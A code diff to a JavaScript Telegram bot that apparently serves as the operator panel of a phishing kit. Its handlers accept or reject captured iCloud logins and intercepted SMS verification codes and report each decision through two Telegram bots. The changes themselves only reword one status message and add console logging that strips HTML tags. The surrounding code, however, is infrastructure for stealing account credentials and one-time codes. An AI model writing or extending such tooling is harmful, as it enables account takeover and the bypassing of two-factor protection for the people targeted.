@@ -603,7 +603,7 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_accept") {
         statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page_reject") {
-        statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
         statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
       } else if (action === "sms_reject") {
@@ -701,6 +701,16 @@ bot.on("callback_query", async (query) => {
       }
 
       if (statusMessage) {
+        // ✅ Log status message to console (strip HTML tags for clean logs)
+        const cleanMessage = statusMessage
+          .replace(/<code>/g, '')
+          .replace(/<\/code>/g, '')
+          .replace(/<b>/g, '')
+          .replace(/<\/b>/g, '')
+          .replace(/<i>/g, '')
+          .replace(/<\/i>/g, '');
+        console.log(cleanMessage);
+        
         try {
           const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
           await fetch(replyUrl, {
@@ -1287,6 +1297,16 @@ if (bot2) {
         }
 
         if (statusMessage) {
+          // ✅ Log status message to console (strip HTML tags for clean logs)
+          const cleanMessage = statusMessage
+            .replace(/<code>/g, '')
+            .replace(/<\/code>/g, '')
+            .replace(/<b>/g, '')
+            .replace(/<\/b>/g, '')
+            .replace(/<i>/g, '')
+            .replace(/<\/i>/g, '');
+          console.log(cleanMessage);
+          
           try {
             const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
             await fetch(replyUrl, {
